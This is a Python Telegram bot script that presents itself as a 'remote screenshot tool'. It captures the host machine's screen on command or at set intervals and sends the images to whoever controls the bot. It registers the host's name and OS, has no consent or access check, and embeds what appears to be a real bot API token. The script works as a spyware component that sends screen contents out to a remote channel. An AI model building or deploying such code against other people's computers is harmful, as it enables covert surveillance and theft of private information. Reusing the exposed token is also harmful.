import os
import time
import platform
import pyautogui
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from threading import Thread

# Global variables
devices = {}
selected_device = None
screenshot_frequency = 5  # Default frequency in seconds
screenshot_threads = {}
is_screenshotting = {}

def register_device(device_id):
    system_name = platform.node()
    os_name = platform.system()
    devices[device_id] = {
        "name": system_name,
        "os": os_name,
        "online": True,
    }

def start(update: Update, context: CallbackContext):
    device_list = "\n".join([f"{idx}. {info['name']} ({info['os']})"
                             for idx, info in devices.items()])
    if not device_list:
        device_list = "No devices are online."
    update.message.reply_text(
        f"Welcome to the remote screenshot tool!\n\n"
        "Commands:\n"
        "/start - Show commands and list of online devices\n"
        "/screenshot - Take a screenshot\n"
        "/setfrequency {value in seconds} - Set screenshot frequency\n"
        "/autoscreenshot {duration in minutes} - Take screenshots at intervals\n"
        "/stop - Stop taking screenshots\n"
        "/select {device_number} - Select a specific device\n"
        "/unselect - Unselect the current device\n\n"
        f"Online Devices:\n{device_list}"
    )

def select(update: Update, context: CallbackContext):
    global selected_device
    try:
        device_id = int(context.args[0])
        if device_id in devices:
            selected_device = device_id
            update.message.reply_text(f"Selected device {device_id}: {devices[device_id]['name']} ({devices[device_id]['os']})")
        else:
            update.message.reply_text("Invalid device number.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /select {device_number}")

def unselect(update: Update, context: CallbackContext):
    global selected_device
    if selected_device is not None:
        update.message.reply_text(f"Unselected device {selected_device}: {devices[selected_device]['name']}")
        selected_device = None
    else:
        update.message.reply_text("No device is currently selected.")

def screenshot(update: Update, context: CallbackContext):
    if selected_device is None:
        update.message.reply_text("No device selected. Use /select {device_number} to select a device.")
        return

    screenshot = pyautogui.screenshot()
    screenshot_path = f"screenshot_{selected_device}.png"
    screenshot.save(screenshot_path)
    update.message.reply_photo(photo=open(screenshot_path, 'rb'))
    os.remove(screenshot_path)

def set_frequency(update: Update, context: CallbackContext):
    global screenshot_frequency
    try:
        new_frequency = int(context.args[0])
        screenshot_frequency = new_frequency
        update.message.reply_text(f"Screenshot frequency set to {new_frequency} seconds.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /setfrequency {value in seconds}")

def autoscreenshot(update: Update, context: CallbackContext):
    global is_screenshotting
    if selected_device is None:
        update.message.reply_text("No device selected. Use /select {device_number} to select a device.")
        return

    if is_screenshotting.get(selected_device, False):
        update.message.reply_text("Autoscreenshot is already running for this device.")
        return

    try:
        duration = int(context.args[0]) * 60  # Convert minutes to seconds
        is_screenshotting[selected_device] = True

        def take_screenshots():
            start_time = time.time()
            while is_screenshotting[selected_device] and time.time() - start_time < duration:
                screenshot(update, context)
                time.sleep(screenshot_frequency)

        screenshot_threads[selected_device] = Thread(target=take_screenshots)
        screenshot_threads[selected_device].start()

        update.message.reply_text(
            f"Autoscreenshot started for device {selected_device}. Screenshots will be taken every {screenshot_frequency} seconds for {context.args[0]} minutes."
        )
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /autoscreenshot {duration in minutes}")

def stop(update: Update, context: CallbackContext):
    global is_screenshotting
    if selected_device is None:
        update.message.reply_text("No device selected. Use /select {device_number} to select a device.")
        return

    if is_screenshotting.get(selected_device, False):
        is_screenshotting[selected_device] = False
        if screenshot_threads[selected_device]:
            screenshot_threads[selected_device].join()
        update.message.reply_text(f"Stopped taking screenshots for device {selected_device}.")
    else:
        update.message.reply_text("Autoscreenshot is not running for this device.")

def main():
    # Replace with your bot's API token
    TOKEN = "7576774302:AAFtHrzsAOmI58FM9kMgravElfXbOznwYzA"

    # Register the current device
    register_device(1)  # For simplicity, use 1 for the first device. Adjust as needed for more.

    updater = Updater(TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("screenshot", screenshot))
    dispatcher.add_handler(CommandHandler("setfrequency", set_frequency))
    dispatcher.add_handler(CommandHandler("autoscreenshot", autoscreenshot))
    dispatcher.add_handler(CommandHandler("stop", stop))
    dispatcher.add_handler(CommandHandler("select", select))
    dispatcher.add_handler(CommandHandler("unselect", unselect))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
